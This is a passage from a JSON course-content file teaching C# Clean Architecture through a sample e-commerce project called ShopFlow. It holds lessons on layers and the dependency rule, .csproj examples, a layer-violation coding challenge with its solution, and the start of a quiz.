                  "text": "[Params(100, 1000, 10000)] creates three benchmark runs with different Size values."
                },
                {
                  "level": 3,
                  "text": "Dictionary.TryGetValue is O(1) - single hash lookup regardless of size."
                },
                {
                  "level": 4,
                  "text": "Search for middle element to demonstrate worst-case linear search (n/2 iterations)."
                },
                {
                  "level": 5,
                  "text": "[Benchmark(Baseline = true)] marks the reference. Other methods shown as ratio (2x faster, 0.5x = half speed)."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Running benchmarks in Debug mode",
                  "consequence": "Debug builds include extra checks, no optimizations. Results are meaningless!",
                  "correction": "Always: dotnet run -c Release. Debug performance can be 10-100x slower."
                },
                {
                  "mistake": "Not returning values from benchmark methods",
                  "consequence": "Compiler might optimize away unused computations. Benchmark measures nothing!",
                  "correction": "Always return the result. BenchmarkDotNet uses it to prevent dead code elimination."
                },
                {
                  "mistake": "Including setup in benchmark method",
                  "consequence": "Measuring data creation instead of the actual operation. Misleading results!",
                  "correction": "Use [GlobalSetup] for initialization. Benchmark method should only measure the target operation."
                },
                {
                  "mistake": "Benchmarking tiny operations without warmup",
                  "consequence": "JIT compilation included in first runs. Inconsistent, inflated times.",
                  "correction": "BenchmarkDotNet handles warmup automatically. Trust its warmup iterations."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        }
      ]
    },
    {
      "id": "module-18",
      "title": "Clean Architecture",
      "description": "Structure your applications with Clean Architecture principles. Learn about layers, dependency inversion, and how to organize ShopFlow for maintainability.",
      "difficulty": "intermediate",
      "estimatedHours": 4,
      "lessons": [
        {
          "id": "lesson-18-01",
          "title": "Why Architecture Matters (The Clean Way)",
          "moduleId": "module-18",
          "order": 1,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding Clean Architecture",
              "content": "Imagine you're constructing a building. You wouldn't start by painting the walls or installing light fixtures - you need a solid foundation first, then the structural framework, and finally the finishing touches. Clean Architecture works the same way for software.\n\nTHE BUILDING CONSTRUCTION ANALOGY:\n\nFOUNDATION (Domain Layer):\n- This is the bedrock of your building - the concrete foundation that everything else rests upon\n- In software, this is your core business logic: entities, value objects, business rules\n- Just like a foundation doesn't care what color you paint the walls, the Domain layer doesn't care about databases or UI frameworks\n- It's the most stable part - you don't change foundations often\n\nSTRUCTURAL FRAMEWORK (Application Layer):\n- The steel beams and load-bearing walls that give your building shape and function\n- In software, these are your use cases, application services, and interfaces\n- The framework connects the foundation to the outer walls but doesn't know about paint colors\n- It orchestrates how things work together\n\nOUTER WALLS AND SYSTEMS (Infrastructure Layer):\n- Electrical wiring, plumbing, HVAC - the systems that connect your building to the outside world\n- In software, this is Entity Framework Core, external APIs, file systems, message queues\n- These can be replaced or upgraded without touching the foundation\n- If you want to switch from gas to electric heating, you don't rebuild the foundation\n\nINTERIOR FINISHES (Presentation Layer):\n- Paint, flooring, light fixtures - what users actually see and interact with\n- In software, this is your API controllers, Blazor components, console output\n- You can completely renovate the interior without touching the structural framework\n- Trends change, but good bones last forever\n\nThink: 'Clean Architecture is like building a house - start with a solid foundation (domain), add the framework (application), connect the systems (infrastructure), then add the finishes (presentation). Each layer protects the ones beneath it from change!'"
            },
            {
              "type": "EXAMPLE",
              "title": "ShopFlow Project Structure",
              "content": "This example shows how ShopFlow is organized following Clean Architecture principles.",
              "code": "// ===== SHOPFLOW CLEAN ARCHITECTURE STRUCTURE =====\n// Solution folder organization\n\n/*\nShopFlow/\n├── src/\n│   ├── ShopFlow.Domain/              # Core business logic (innermost)\n│   │   ├── Entities/\n│   │   │   ├── Product.cs\n│   │   │   ├── Order.cs\n│   │   │   ├── Customer.cs\n│   │   │   └── OrderItem.cs\n│   │   ├── ValueObjects/\n│   │   │   ├── Money.cs\n│   │   │   ├── Address.cs\n│   │   │   └── Email.cs\n│   │   ├── Enums/\n│   │   │   ├── OrderStatus.cs\n│   │   │   └── PaymentMethod.cs\n│   │   ├── Exceptions/\n│   │   │   ├── DomainException.cs\n│   │   │   └── InsufficientStockException.cs\n│   │   └── ShopFlow.Domain.csproj     # NO dependencies on other projects!\n│   │\n│   ├── ShopFlow.Application/          # Use cases and interfaces\n│   │   ├── Interfaces/\n│   │   │   ├── IProductRepository.cs\n│   │   │   ├── IOrderRepository.cs\n│   │   │   ├── IEmailService.cs\n│   │   │   └── IPaymentGateway.cs\n│   │   ├── Services/\n│   │   │   ├── OrderService.cs\n│   │   │   ├── ProductService.cs\n│   │   │   └── InventoryService.cs\n│   │   ├── DTOs/\n│   │   │   ├── CreateOrderRequest.cs\n│   │   │   ├── OrderResponse.cs\n│   │   │   └── ProductDto.cs\n│   │   ├── Validators/\n│   │   │   └── CreateOrderValidator.cs\n│   │   └── ShopFlow.Application.csproj # References: ShopFlow.Domain\n│   │\n│   ├── ShopFlow.Infrastructure/        # External implementations\n│   │   ├── Data/\n│   │   │   ├── ShopFlowDbContext.cs\n│   │   │   ├── Configurations/\n│   │   │   │   ├── ProductConfiguration.cs\n│   │   │   │   └── OrderConfiguration.cs\n│   │   │   └── Migrations/\n│   │   ├── Repositories/\n│   │   │   ├── ProductRepository.cs    # Implements IProductRepository\n│   │   │   └── OrderRepository.cs      # Implements IOrderRepository\n│   │   ├── Services/\n│   │   │   ├── EmailService.cs         # Implements IEmailService\n│   │   │   └── StripePaymentGateway.cs # Implements IPaymentGateway\n│   │   └── ShopFlow.Infrastructure.csproj # References: ShopFlow.Application\n│   │\n│   └── ShopFlow.API/                   # Presentation layer\n│       ├── Controllers/\n│       │   ├── ProductsController.cs\n│       │   └── OrdersController.cs\n│       ├── Endpoints/                  # Minimal API endpoints\n│       │   ├── ProductEndpoints.cs\n│       │   └── OrderEndpoints.cs\n│       ├── Middleware/\n│       │   └── ExceptionHandlingMiddleware.cs\n│       ├── Program.cs                  # DI configuration\n│       └── ShopFlow.API.csproj         # References: ShopFlow.Infrastructure\n│\n└── tests/\n    ├── ShopFlow.Domain.Tests/\n    ├── ShopFlow.Application.Tests/\n    └── ShopFlow.API.Tests/\n*/\n\n// ===== DEPENDENCY DIRECTION =====\n// API → Infrastructure → Application → Domain\n// Dependencies ALWAYS point inward!\n\n// Domain: NO project references (standalone)\n// Application: References Domain only\n// Infrastructure: References Application (and transitively Domain)\n// API: References Infrastructure (and transitively all others)",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "The Layers Explained",
              "content": "## Understanding Each Layer\n\n**DOMAIN LAYER (The Core)**\nThe Domain layer is the heart of your application. It contains:\n- **Entities**: Core business objects with identity (Product, Order, Customer)\n- **Value Objects**: Immutable objects without identity (Money, Address, Email)\n- **Domain Events**: Things that happened in the domain (OrderPlaced, PaymentReceived)\n- **Business Rules**: Core logic that never changes regardless of UI or database\n\nThe Domain layer has ZERO dependencies on other projects. It doesn't know about Entity Framework, ASP.NET Core, or any external framework. This makes it extremely testable and portable.\n\n**APPLICATION LAYER (The Orchestrator)**\nThe Application layer coordinates the work. It contains:\n- **Interfaces**: Contracts that Infrastructure must implement (IProductRepository, IEmailService)\n- **Application Services**: Use cases that orchestrate domain objects (CreateOrderService, ProcessPaymentService)\n- **DTOs**: Data transfer objects for moving data between layers\n- **Validators**: Input validation using FluentValidation or similar\n\nThe Application layer depends ONLY on Domain. It defines interfaces but doesn't implement them - that's Infrastructure's job.\n\n**INFRASTRUCTURE LAYER (The Adapter)**\nThe Infrastructure layer implements all external concerns:\n- **Database Access**: Entity Framework Core DbContext, repositories\n- **External Services**: Email providers, payment gateways, cloud storage\n- **File System**: Reading/writing files\n- **Third-party APIs**: Integration with external systems\n\nInfrastructure implements the interfaces defined in Application. This is the Dependency Inversion Principle in action!\n\n**PRESENTATION LAYER (The UI)**\nThe Presentation layer is what users interact with:\n- **API Controllers/Endpoints**: HTTP request handling\n- **Blazor Components**: Interactive web UI\n- **Console Apps**: Command-line interfaces\n- **Background Services**: Hosted services for background work\n\nPresentation depends on Infrastructure for DI registration but communicates with Application layer services."
            },
            {
              "type": "ARCHITECTURE",
              "title": "Dependency Rule",
              "content": "## The Golden Rule: Dependencies Point Inward\n\nThe most important rule in Clean Architecture is the **Dependency Rule**: source code dependencies can only point INWARD. Nothing in an inner circle can know anything about something in an outer circle.\n\n**THE CONCENTRIC CIRCLES:**\n```\n┌─────────────────────────────────────────────┐\n│  PRESENTATION (API, Blazor, Console)        │\n│  ┌─────────────────────────────────────┐    │\n│  │  INFRASTRUCTURE (EF Core, APIs)     │    │\n│  │  ┌─────────────────────────────┐    │    │\n│  │  │  APPLICATION (Use Cases)    │    │    │\n│  │  │  ┌─────────────────────┐    │    │    │\n│  │  │  │  DOMAIN (Entities)  │    │    │    │\n│  │  │  └─────────────────────┘    │    │    │\n│  │  └─────────────────────────────┘    │    │\n│  └─────────────────────────────────────┘    │\n└─────────────────────────────────────────────┘\n```\n\n**DEPENDENCY INVERSION IN ACTION:**\n\nThe problem: Application layer needs to save data to a database, but it can't reference Entity Framework (that would violate the dependency rule).\n\nThe solution: Application defines an INTERFACE, Infrastructure IMPLEMENTS it.\n\n```csharp\n// In Application layer (inner)\npublic interface IProductRepository\n{\n    Task<Product> GetByIdAsync(int id);\n    Task AddAsync(Product product);\n}\n\n// In Infrastructure layer (outer)\npublic class ProductRepository : IProductRepository\n{\n    private readonly ShopFlowDbContext _context;\n    \n    public async Task<Product> GetByIdAsync(int id)\n        => await _context.Products.FindAsync(id);\n        \n    public async Task AddAsync(Product product)\n        => await _context.Products.AddAsync(product);\n}\n```\n\n**WHY THIS MATTERS:**\n\n1. **Testability**: You can test Application layer with mock repositories - no database needed\n2. **Flexibility**: Switch from SQL Server to PostgreSQL by changing only Infrastructure\n3. **Maintainability**: Changes to external systems don't ripple into business logic\n4. **Parallel Development**: Teams can work on different layers independently\n\n**INTERFACES AT BOUNDARIES:**\n\nEvery boundary between layers should have interfaces:\n- Application defines `IProductRepository`, Infrastructure implements it\n- Application defines `IEmailService`, Infrastructure implements it\n- Application defines `IPaymentGateway`, Infrastructure implements it\n\nThe inner layers define WHAT they need (interfaces), outer layers provide HOW (implementations).\n\n**REGISTRATION IN DI CONTAINER:**\n\n```csharp\n// In Program.cs (Presentation layer)\nbuilder.Services.AddScoped<IProductRepository, ProductRepository>();\nbuilder.Services.AddScoped<IEmailService, SendGridEmailService>();\nbuilder.Services.AddScoped<IPaymentGateway, StripePaymentGateway>();\n```\n\nThe DI container wires everything together at runtime, but compile-time dependencies still point inward.\n\nThink: 'The Domain is the sun - everything orbits around it, but it doesn't know or care about the planets. Each layer only knows about the layer directly inside it.'"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-18-01-challenge-01",
              "title": "Fix the Layer Violations",
              "description": "Identify and fix Clean Architecture violations in the given code.",
              "instructions": "The following code has several Clean Architecture violations. Your task is to:\n\n1. Identify which layer each class belongs to\n2. Fix the dependency violations\n3. Add the correct interfaces where needed\n\nRemember: Dependencies should only point inward (Presentation -> Infrastructure -> Application -> Domain).",
              "starterCode": "// PROBLEM: This code has Clean Architecture violations!\n// Fix the issues to follow proper layering.\n\n// Current structure (all in one file for the challenge):\nnamespace ShopFlow;\n\n// This class is in the Domain layer\npublic class Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public decimal Price { get; set; }\n    \n    // VIOLATION: Domain depends on Infrastructure!\n    private readonly SqlConnection _connection;\n    \n    public void Save()\n    {\n        // Direct database access in domain entity\n        _connection.Execute(\"INSERT INTO Products...\");\n    }\n}\n\n// This class is in the Application layer\npublic class ProductService\n{\n    // VIOLATION: Depends on concrete implementation!\n    private readonly SqlProductRepository _repository;\n    \n    public Product GetProduct(int id)\n    {\n        return _repository.GetById(id);\n    }\n}",
              "solution": "// FIXED: Proper Clean Architecture structure\n\n// ===== DOMAIN LAYER =====\nnamespace ShopFlow.Domain.Entities;\n\npublic class Product\n{\n    public int Id { get; private set; }\n    public string Name { get; private set; }\n    public decimal Price { get; private set; }\n    \n    // Domain has NO infrastructure dependencies\n    // Only contains business logic and validation\n    \n    public void UpdatePrice(decimal newPrice)\n    {\n        if (newPrice < 0)\n            throw new DomainException(\"Price cannot be negative\");\n        Price = newPrice;\n    }\n}\n\n// ===== APPLICATION LAYER =====\nnamespace ShopFlow.Application.Interfaces;\n\n// Interface defined in Application layer\npublic interface IProductRepository\n{\n    Product? GetById(int id);\n    void Save(Product product);\n}\n\nnamespace ShopFlow.Application.Services;\n\npublic class ProductService\n{\n    // Depends on INTERFACE, not concrete implementation\n    private readonly IProductRepository _repository;\n    \n    public ProductService(IProductRepository repository)\n    {\n        _repository = repository;\n    }\n    \n    public Product? GetProduct(int id)\n    {\n        return _repository.GetById(id);\n    }\n}\n\n// ===== INFRASTRUCTURE LAYER =====\nnamespace ShopFlow.Infrastructure.Repositories;\n\n// Concrete implementation in Infrastructure\npublic class SqlProductRepository : IProductRepository\n{\n    private readonly DbContext _context;\n    \n    public SqlProductRepository(DbContext context)\n    {\n        _context = context;\n    }\n    \n    public Product? GetById(int id)\n    {\n        return _context.Products.Find(id);\n    }\n    \n    public void Save(Product product)\n    {\n        _context.Products.Add(product);\n        _context.SaveChanges();\n    }\n}",
              "language": "csharp",
              "testCases": [
                {"id": "test-1", "description": "Domain entity has no infrastructure dependencies", "expectedOutput": "No SqlConnection in Product class", "isVisible": true},
                {"id": "test-2", "description": "Application layer uses interface", "expectedOutput": "IProductRepository interface", "isVisible": true},
                {"id": "test-3", "description": "Infrastructure implements interface", "expectedOutput": "SqlProductRepository : IProductRepository", "isVisible": true}
              ],
              "hints": [
                {"level": 1, "text": "Domain entities should never contain database connections or know how they are stored."},
                {"level": 2, "text": "Create an IProductRepository interface in the Application layer that defines what operations are needed."},
                {"level": 3, "text": "The ProductService should depend on IProductRepository (interface), not SqlProductRepository (concrete)."},
                {"level": 4, "text": "Move the actual database code to an Infrastructure class that implements the interface."}
              ],
              "commonMistakes": [
                {"mistake": "Putting interfaces in Infrastructure layer", "consequence": "Application layer would depend on Infrastructure, violating the dependency rule", "correction": "Define interfaces in Application layer, implementations in Infrastructure"},
                {"mistake": "Having domain entities call repositories directly", "consequence": "Domain becomes coupled to data access, harder to test and change", "correction": "Use Application Services to orchestrate between Domain and Infrastructure"}
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-18-02",
          "title": "The Four Layers (Domain, Application, Infrastructure, Presentation)",
          "moduleId": "module-18",
          "order": 2,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "The Layer Cake Model",
              "content": "Think of Clean Architecture as baking a magnificent four-layer cake - each layer has its own unique purpose, flavor, and ingredients, but together they create something far greater than the sum of their parts.\n\nTHE FOUR-LAYER CAKE:\n\n**THE BOTTOM LAYER - DOMAIN (Rich Chocolate Foundation)**\nThis is your dense, rich chocolate cake layer at the bottom. It's the foundation that holds everything up. You bake this layer first, and it needs to be absolutely perfect because everything else rests on it. In software, the Domain layer contains your business entities, value objects, and core business rules. Just like how a chocolate cake layer doesn't need frosting or decorations to be chocolate - it IS chocolate - your Domain layer doesn't need databases or HTTP to define what a Product or Order is. It simply IS your business logic.\n\n**THE SECOND LAYER - APPLICATION (Vanilla Coordination Layer)**\nThis is your vanilla layer that sits on top of the chocolate. It's lighter, it coordinates flavors, and it decides how the chocolate layer below will be experienced. The Application layer contains your use cases - the recipes for what your application can do. It defines interfaces (like saying 'I need frosting here') without actually providing the frosting. CreateOrderUseCase, ProcessPaymentUseCase - these are your recipes that orchestrate the domain below.\n\n**THE THIRD LAYER - INFRASTRUCTURE (The Frosting and Filling)**\nThe frosting and filling are what connect everything together and make the cake deliverable. You can swap buttercream for cream cheese frosting without changing the cake layers themselves. Infrastructure is your Entity Framework DbContext, your email services, your payment gateways. It implements the interfaces defined by Application. Want to switch from SQL Server to PostgreSQL? Just change the frosting - the cake layers remain untouched.\n\n**THE TOP LAYER - PRESENTATION (The Decorations)**\nThe decorations on top - the fondant roses, sprinkles, and 'Happy Birthday' writing. This is what the customer sees and interacts with. It can be completely redesigned without touching the cake itself. Your API controllers, Blazor components, and console interfaces live here. You could have the same cake with birthday decorations, wedding decorations, or minimalist modern decorations.\n\n**THE CRITICAL RULE:**\nWhen you slice the cake, each layer only touches the layer directly below it. The decorations sit on the frosting, not embedded in the chocolate. The frosting sits on the vanilla, not mixed into it. Dependencies flow DOWN through the layers, never up. The chocolate layer has no idea what decorations are on top - it just focuses on being the best chocolate layer it can be.\n\nThink: 'Each layer depends only on the layer directly below it. The Domain cake layer has zero knowledge of what decorations might someday sit on top!'"
            },
            {
              "type": "EXAMPLE",
              "title": "ShopFlow Solution Structure",
              "content": "Here's how ShopFlow's Clean Architecture solution is organized as separate .NET projects, showing the complete folder structure for a real-world e-commerce application.",
              "code": "// ===== SHOPFLOW CLEAN ARCHITECTURE - COMPLETE SOLUTION STRUCTURE =====\n\n/*\nShopFlow.sln\n│\n├── src/\n│   │\n│   ├── ShopFlow.Domain/                    ← INNERMOST LAYER (The Core)\n│   │   ├── Entities/\n│   │   │   ├── Product.cs                   # Core business entity\n│   │   │   ├── Order.cs                     # Aggregate root\n│   │   │   ├── OrderItem.cs                 # Part of Order aggregate\n│   │   │   ├── Customer.cs                  # Customer entity\n│   │   │   └── Category.cs                  # Product categorization\n│   │   │\n│   │   ├── ValueObjects/\n│   │   │   ├── Money.cs                     # Immutable money representation\n│   │   │   ├── Address.cs                   # Shipping/billing address\n│   │   │   ├── Email.cs                     # Validated email address\n│   │   │   ├── PhoneNumber.cs               # Validated phone\n│   │   │   └── Quantity.cs                  # Non-negative quantity\n│   │   │\n│   │   ├── Enums/\n│   │   │   ├── OrderStatus.cs               # Pending, Processing, Shipped, etc.\n│   │   │   ├── PaymentStatus.cs             # Unpaid, Paid, Refunded\n│   │   │   └── ProductStatus.cs             # Active, Discontinued, OutOfStock\n│   │   │\n│   │   ├── Events/\n│   │   │   ├── OrderPlacedEvent.cs          # Domain event\n│   │   │   ├── PaymentReceivedEvent.cs      # Domain event\n│   │   │   └── InventoryLowEvent.cs         # Domain event\n│   │   │\n│   │   ├── Exceptions/\n│   │   │   ├── DomainException.cs           # Base domain exception\n│   │   │   ├── InsufficientStockException.cs\n│   │   │   └── InvalidOrderStateException.cs\n│   │   │\n│   │   └── ShopFlow.Domain.csproj           # NO PROJECT REFERENCES!\n│   │\n│   ├── ShopFlow.Application/               ← USE CASE LAYER\n│   │   ├── Common/\n│   │   │   ├── Interfaces/\n│   │   │   │   ├── IUnitOfWork.cs           # Transaction boundary\n│   │   │   │   ├── ICurrentUserService.cs   # Current user context\n│   │   │   │   └── IDateTimeService.cs      # Abstracting DateTime.Now\n│   │   │   ├── Behaviors/\n│   │   │   │   ├── ValidationBehavior.cs    # MediatR pipeline\n│   │   │   │   └── LoggingBehavior.cs       # Cross-cutting concerns\n│   │   │   └── Mappings/\n│   │   │       └── MappingProfile.cs        # AutoMapper configuration\n│   │   │\n│   │   ├── Products/\n│   │   │   ├── Commands/\n│   │   │   │   ├── CreateProduct/\n│   │   │   │   │   ├── CreateProductCommand.cs\n│   │   │   │   │   ├── CreateProductHandler.cs\n│   │   │   │   │   └── CreateProductValidator.cs\n│   │   │   │   └── UpdateProduct/\n│   │   │   │       ├── UpdateProductCommand.cs\n│   │   │   │       └── UpdateProductHandler.cs\n│   │   │   ├── Queries/\n│   │   │   │   ├── GetProduct/\n│   │   │   │   │   ├── GetProductQuery.cs\n│   │   │   │   │   ├── GetProductHandler.cs\n│   │   │   │   │   └── ProductDto.cs\n│   │   │   │   └── GetProducts/\n│   │   │   │       ├── GetProductsQuery.cs\n│   │   │   │       └── GetProductsHandler.cs\n│   │   │   └── IProductRepository.cs        # Repository interface\n│   │   │\n│   │   ├── Orders/\n│   │   │   ├── Commands/\n│   │   │   │   └── CreateOrder/\n│   │   │   │       ├── CreateOrderCommand.cs\n│   │   │   │       └── CreateOrderHandler.cs\n│   │   │   ├── Queries/\n│   │   │   │   └── GetOrderById/\n│   │   │   │       ├── GetOrderQuery.cs\n│   │   │   │       └── OrderDto.cs\n│   │   │   ├── IOrderRepository.cs\n│   │   │   └── IPaymentGateway.cs           # External service interface\n│   │   │\n│   │   ├── Notifications/\n│   │   │   └── IEmailService.cs             # Email service interface\n│   │   │\n│   │   └── ShopFlow.Application.csproj      # References: ShopFlow.Domain\n│   │\n│   ├── ShopFlow.Infrastructure/            ← EXTERNAL CONCERNS\n│   │   ├── Data/\n│   │   │   ├── AppDbContext.cs              # EF Core DbContext\n│   │   │   ├── Configurations/\n│   │   │   │   ├── ProductConfiguration.cs  # Fluent API config\n│   │   │   │   ├── OrderConfiguration.cs\n│   │   │   │   └── CustomerConfiguration.cs\n│   │   │   ├── Migrations/\n│   │   │   │   └── 20240115_InitialCreate.cs\n│   │   │   └── UnitOfWork.cs                # IUnitOfWork implementation\n│   │   │\n│   │   ├── Repositories/\n│   │   │   ├── ProductRepository.cs         # IProductRepository impl\n│   │   │   ├── OrderRepository.cs           # IOrderRepository impl\n│   │   │   └── RepositoryBase.cs            # Generic repository\n│   │   │\n│   │   ├── Services/\n│   │   │   ├── EmailService.cs              # IEmailService impl (SendGrid)\n│   │   │   ├── DateTimeService.cs           # IDateTimeService impl\n│   │   │   └── CurrentUserService.cs        # ICurrentUserService impl\n│   │   │\n│   │   ├── ExternalServices/\n│   │   │   ├── StripePaymentGateway.cs      # IPaymentGateway impl\n│   │   │   └── TwilioSmsService.cs          # SMS notifications\n│   │   │\n│   │   ├── DependencyInjection.cs           # Extension method for DI\n│   │   │\n│   │   └── ShopFlow.Infrastructure.csproj   # References: ShopFlow.Application\n│   │\n│   └── ShopFlow.API/                        ← OUTERMOST LAYER (Presentation)\n│       ├── Controllers/\n│       │   ├── ProductsController.cs        # REST endpoints\n│       │   ├── OrdersController.cs\n│       │   └── CustomersController.cs\n│       │\n│       ├── Endpoints/                       # Minimal API alternative\n│       │   ├── ProductEndpoints.cs\n│       │   └── OrderEndpoints.cs\n│       │\n│       ├── Middleware/\n│       │   ├── ExceptionHandlingMiddleware.cs\n│       │   └── RequestLoggingMiddleware.cs\n│       │\n│       ├── Filters/\n│       │   └── ValidationFilter.cs\n│       │\n│       ├── Program.cs                       # Application entry point + DI\n│       ├── appsettings.json\n│       │\n│       └── ShopFlow.API.csproj              # References: ShopFlow.Infrastructure\n│\n└── tests/\n    ├── ShopFlow.Domain.Tests/               # Unit tests for domain logic\n    ├── ShopFlow.Application.Tests/          # Unit tests with mocked repos\n    ├── ShopFlow.Infrastructure.Tests/       # Integration tests with DB\n    └── ShopFlow.API.Tests/                  # API integration tests\n*/\n\n// KEY INSIGHT: Each project only references the layer directly below it!\n// Domain → (no references)\n// Application → Domain\n// Infrastructure → Application\n// API → Infrastructure",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Dependency Rule - Dependencies Point Inward Only",
              "content": "## The Dependency Rule: The Heart of Clean Architecture\n\nThe Dependency Rule is the single most important principle in Clean Architecture. It states that source code dependencies must point INWARD - toward higher-level policies and away from outer-layer details.\n\n**VISUALIZING THE RULE:**\n\nImagine concentric circles, with Domain at the center:\n\n```\n         ┌────────────────────────────────────────┐\n         │          PRESENTATION (API)             │\n         │   ┌────────────────────────────────┐   │\n         │   │      INFRASTRUCTURE (EF)       │   │\n         │   │   ┌────────────────────────┐   │   │\n         │   │   │    APPLICATION         │   │   │\n         │   │   │   ┌────────────────┐   │   │   │\n         │   │   │   │    DOMAIN      │   │   │   │\n         │   │   │   │   (Center)     │   │   │   │\n         │   │   │   └────────────────┘   │   │   │\n         │   │   └────────────────────────┘   │   │\n         │   └────────────────────────────────┘   │\n         └────────────────────────────────────────┘\n                    ← Dependencies point inward\n```\n\n**WHAT 'INWARD' MEANS:**\n\n1. **Domain Layer** (innermost) - Has ZERO dependencies on any other project. It doesn't reference Application, Infrastructure, or Presentation. It's completely self-contained.\n\n2. **Application Layer** - Only references Domain. It can use entities and value objects from Domain, but knows nothing about Entity Framework or ASP.NET Core.\n\n3. **Infrastructure Layer** - References Application (and transitively Domain). It implements the interfaces defined in Application.\n\n4. **Presentation Layer** - References Infrastructure (and transitively all inner layers). It wires everything together with dependency injection.\n\n**WHY THIS MATTERS:**\n\n1. **Isolation**: The Domain layer can be tested without any external dependencies. No database needed, no HTTP mocking - just pure unit tests.\n\n2. **Replaceability**: Want to switch from SQL Server to MongoDB? Only Infrastructure changes. The business logic in Domain and Application remains untouched.\n\n3. **Framework Independence**: ASP.NET Core could be replaced with a different framework. Domain and Application wouldn't know or care.\n\n4. **Parallel Development**: Teams can work on different layers simultaneously without stepping on each other's toes.\n\n**THE DEPENDENCY INVERSION TRICK:**\n\nHow does Application use a database without knowing about Entity Framework? Through interfaces!\n\n- Application defines: `interface IProductRepository { Task<Product> GetById(int id); }`\n- Infrastructure implements: `class ProductRepository : IProductRepository { /* uses EF */ }`\n- At runtime, DI container wires them together\n\nThis is the Dependency Inversion Principle (the D in SOLID) in action. High-level modules (Application) don't depend on low-level modules (Infrastructure). Both depend on abstractions (interfaces)."
            },
            {
              "type": "ARCHITECTURE",
              "title": "Project References in .NET",
              "content": "## Configuring Project References for Clean Architecture\n\nIn .NET, project references define compile-time dependencies. Clean Architecture requires careful configuration of these references to enforce the dependency rule.",
              "code": "// ===== DOMAIN PROJECT (.csproj) =====\n// File: src/ShopFlow.Domain/ShopFlow.Domain.csproj\n\n<Project Sdk=\"Microsoft.NET.Sdk\">\n\n  <PropertyGroup>\n    <TargetFramework>net9.0</TargetFramework>\n    <ImplicitUsings>enable</ImplicitUsings>\n    <Nullable>enable</Nullable>\n  </PropertyGroup>\n\n  <!-- NOTICE: NO ProjectReferences! Domain is completely independent -->\n  <!-- Only basic packages for things like data annotations if needed -->\n  <ItemGroup>\n    <!-- Minimal dependencies - avoid external packages when possible -->\n  </ItemGroup>\n\n</Project>\n\n\n// ===== APPLICATION PROJECT (.csproj) =====\n// File: src/ShopFlow.Application/ShopFlow.Application.csproj\n\n<Project Sdk=\"Microsoft.NET.Sdk\">\n\n  <PropertyGroup>\n    <TargetFramework>net9.0</TargetFramework>\n    <ImplicitUsings>enable</ImplicitUsings>\n    <Nullable>enable</Nullable>\n  </PropertyGroup>\n\n  <!-- References ONLY Domain -->\n  <ItemGroup>\n    <ProjectReference Include=\"..\\ShopFlow.Domain\\ShopFlow.Domain.csproj\" />\n  </ItemGroup>\n\n  <!-- Application-level packages (no infrastructure dependencies!) -->\n  <ItemGroup>\n    <PackageReference Include=\"MediatR\" Version=\"12.2.0\" />\n    <PackageReference Include=\"FluentValidation\" Version=\"11.9.0\" />\n    <PackageReference Include=\"AutoMapper\" Version=\"12.0.1\" />\n  </ItemGroup>\n\n</Project>\n\n\n// ===== INFRASTRUCTURE PROJECT (.csproj) =====\n// File: src/ShopFlow.Infrastructure/ShopFlow.Infrastructure.csproj\n\n<Project Sdk=\"Microsoft.NET.Sdk\">\n\n  <PropertyGroup>\n    <TargetFramework>net9.0</TargetFramework>\n    <ImplicitUsings>enable</ImplicitUsings>\n    <Nullable>enable</Nullable>\n  </PropertyGroup>\n\n  <!-- References Application (which transitively includes Domain) -->\n  <ItemGroup>\n    <ProjectReference Include=\"..\\ShopFlow.Application\\ShopFlow.Application.csproj\" />\n  </ItemGroup>\n\n  <!-- THIS is where all the \"heavy\" packages live -->\n  <ItemGroup>\n    <PackageReference Include=\"Microsoft.EntityFrameworkCore\" Version=\"9.0.0\" />\n    <PackageReference Include=\"Microsoft.EntityFrameworkCore.SqlServer\" Version=\"9.0.0\" />\n    <PackageReference Include=\"Microsoft.EntityFrameworkCore.Tools\" Version=\"9.0.0\" />\n    <PackageReference Include=\"SendGrid\" Version=\"9.29.2\" />\n    <PackageReference Include=\"Stripe.net\" Version=\"43.0.0\" />\n  </ItemGroup>\n\n</Project>\n\n\n// ===== API/PRESENTATION PROJECT (.csproj) =====\n// File: src/ShopFlow.API/ShopFlow.API.csproj\n\n<Project Sdk=\"Microsoft.NET.Sdk.Web\">\n\n  <PropertyGroup>\n    <TargetFramework>net9.0</TargetFramework>\n    <ImplicitUsings>enable</ImplicitUsings>\n    <Nullable>enable</Nullable>\n  </PropertyGroup>\n\n  <!-- References Infrastructure (which transitively includes Application and Domain) -->\n  <ItemGroup>\n    <ProjectReference Include=\"..\\ShopFlow.Infrastructure\\ShopFlow.Infrastructure.csproj\" />\n  </ItemGroup>\n\n  <!-- Only presentation-layer packages -->\n  <ItemGroup>\n    <PackageReference Include=\"Scalar.AspNetCore\" Version=\"1.2.0\" />\n  </ItemGroup>\n\n</Project>\n\n\n// ===== WHY THIS STRUCTURE WORKS =====\n/*\nCompile-time dependency chain:\n  API → Infrastructure → Application → Domain\n\nAt compile time:\n- Domain knows about: nothing external\n- Application knows about: Domain entities, value objects, events\n- Infrastructure knows about: Application interfaces + Domain types\n- API knows about: Everything (but should only use Application services)\n\nAt runtime:\n- DI container resolves interfaces to implementations\n- API calls Application services\n- Application services use interfaces (IProductRepository)\n- Infrastructure implementations get injected\n\nBENEFIT: If you accidentally try to use EF Core in Application layer,\nyou'll get a compile error because Application doesn't reference\nMicrosoft.EntityFrameworkCore!\n*/",
              "language": "xml"
            }
          ],
          "challenges": [
            {
              "type": "QUIZ",
              "id": "lesson-18-02-challenge-01",
              "title": "Interface Placement in Clean Architecture",
              "description": "Test your understanding of where interfaces belong in Clean Architecture layers.",
              "question": "In a Clean Architecture project, you need to define an IProductRepository interface that will be implemented by a class using Entity Framework Core. Which layer should contain the IProductRepository interface definition?",
              "options": [
                "Domain Layer - because Product is a domain entity",
                "Application Layer - because it defines what the application needs without knowing how it's implemented",
                "Infrastructure Layer - because that's where Entity Framework Core lives",
                "Presentation Layer - because that's where dependency injection is configured"
              ],
